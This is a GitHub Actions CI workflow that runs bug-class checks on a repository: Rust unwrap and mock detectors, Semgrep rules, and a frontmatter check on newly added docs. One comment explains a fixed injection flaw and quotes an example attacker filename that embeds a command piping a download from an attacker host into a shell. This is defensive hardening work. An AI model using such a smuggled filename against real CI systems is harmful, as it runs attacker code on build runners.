name: Tripwires

# Class-of-bug detectors: Semgrep rules under scripts/semgrep/ plus the
# Python checks under scripts/ci/ that aren't ratchets. Each runs as a
# separate job so a single failure doesn't mask others.

on:
  pull_request:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: tripwires-${{ github.ref }}
  cancel-in-progress: true

jobs:
  no-unwraps:
    name: No `.unwrap()` in production (Rule 5)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Run check_no_unwraps.py
        run: ./scripts/ci/check_no_unwraps.py

  no-mocks:
    name: No stub/mock types in prod (Rules 2 + 11)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Run check_no_mocks.py
        run: ./scripts/ci/check_no_mocks.py

  semgrep:
    name: Semgrep tripwires (AST-grade)
    runs-on: ubuntu-latest
    # Semgrep can fail open on certain runner edge cases; we accept that
    # rather than re-implement Semgrep's analysis. The Python checks
    # above are the floor — Semgrep is the upgrade.
    steps:
      - uses: actions/checkout@v4

      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: scripts/semgrep/
        # Note: semgrep-action exits non-zero on any ERROR-severity
        # finding. WARNING-severity rules (real-backend-loophole,
        # claim-compression-detector) surface as comments, not blockers.

  frontmatter-required:
    name: Frontmatter required on new .agentile/ docs (Rule 12)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Determine added .md files under .agentile/
        id: added
        env:
          # EX-B-006: pass the diff refs through env (never interpolate ${{ }}
          # into the script body). base/head are SHA-shaped, but keeping them in
          # env is the same discipline the filename path below relies on.
          EVENT_NAME: ${{ github.event_name }}
          PR_BASE: ${{ github.event.pull_request.base.sha }}
          PR_HEAD: ${{ github.event.pull_request.head.sha }}
          PUSH_BASE: ${{ github.event.before }}
          PUSH_HEAD: ${{ github.sha }}
        run: |
          if [[ "$EVENT_NAME" == "pull_request" ]]; then
            base="$PR_BASE"; head="$PR_HEAD"
          else
            base="$PUSH_BASE"; head="$PUSH_HEAD"
          fi
          # EX-B-006: emit the file list as a NUL-delimited FILE, not a shell
          # value. The old code interpolated attacker-controlled filenames via
          # `--files <steps.added.outputs.files>`, so a PR adding a file
          # named `pwned$(curl attacker|sh).md` ran that command on the runner.
          # The consumer now reads this file with --files0; the only thing
          # interpolated downstream is the constant path we choose here.
          list="${RUNNER_TEMP:-/tmp}/added_frontmatter_files"
          git diff --name-only -z --diff-filter=A "$base" "$head" -- '.agentile/**/*.md' \
            | { grep -zv '^\.agentile/INDEX/' || true; } > "$list"
          if [[ -s "$list" ]]; then has_files=1; else has_files=0; fi
          echo "has_files=$has_files" >> "$GITHUB_OUTPUT"
          echo "list=$list" >> "$GITHUB_OUTPUT"

      - name: Check frontmatter on added files
        if: ${{ steps.added.outputs.has_files == '1' }}
        env:
          LIST: ${{ steps.added.outputs.list }}
        run: |
          ./scripts/ci/check_frontmatter.py --files0 "$LIST"

      - name: No new docs
        if: ${{ steps.added.outputs.has_files == '0' }}
        run: |
          echo "No new .md files under .agentile/ in this change; nothing to check."
